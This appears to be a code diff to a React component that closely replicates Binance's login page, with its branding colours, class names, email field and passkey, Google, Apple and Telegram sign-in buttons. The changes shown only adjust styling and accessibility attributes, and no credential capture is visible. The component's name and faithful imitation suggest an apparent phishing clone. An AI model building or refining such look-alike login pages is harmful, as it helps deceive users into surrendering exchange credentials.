@@ -52,7 +52,7 @@ const BinanceLedgerForm: FC = () => {
           <div 
             className="card-page-title !mb-[0px] text-2xl font-semibold" 
             role="heading" 
-            aria-level="1"
+            aria-level={1}
             style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           >
             Log in
@@ -61,11 +61,8 @@ const BinanceLedgerForm: FC = () => {
             <div className="bn-tooltips-wrap qrcode-login-popup">
               <div className="bn-tooltips-ele">
                 <div 
-                  className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors"
-                  style={{
-                    backgroundColor: "var(--color-Vessel, #1E2329)",
-                    "&:hover": { backgroundColor: "var(--color-Input, #2B3139)" }
-                  }}
+                  className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
+                  style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                   role="button" 
                   aria-label="QR code login" 
                   tabIndex={0}
@@ -119,11 +116,8 @@ const BinanceLedgerForm: FC = () => {
                     autoFocus
                     id="bn-formItem-q8nY2Y1v"
                     autoCapitalize="off"
-                    className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none"
-                    style={{
-                      color: "var(--color-PrimaryText, #EAECEF)",
-                      "::placeholder": { color: "var(--color-TertiaryText, #848E9C)" }
-                    }}
+                    className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none placeholder-[#848E9C]"
+                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                     spellCheck="false"
                     autoComplete="username"
                     value={email}
@@ -169,7 +163,7 @@ const BinanceLedgerForm: FC = () => {
         <div className="space-y-3">
           {/* Passkey Button */}
           <button 
-            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors"
+            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
@@ -197,7 +191,7 @@ const BinanceLedgerForm: FC = () => {
 
           {/* Google Button */}
           <button 
-            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors"
+            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
@@ -226,7 +220,7 @@ const BinanceLedgerForm: FC = () => {
 
           {/* Apple Button */}
           <button 
-            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors"
+            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
@@ -253,7 +247,7 @@ const BinanceLedgerForm: FC = () => {
 
           {/* Telegram Button */}
           <button 
-            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors"
+            className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
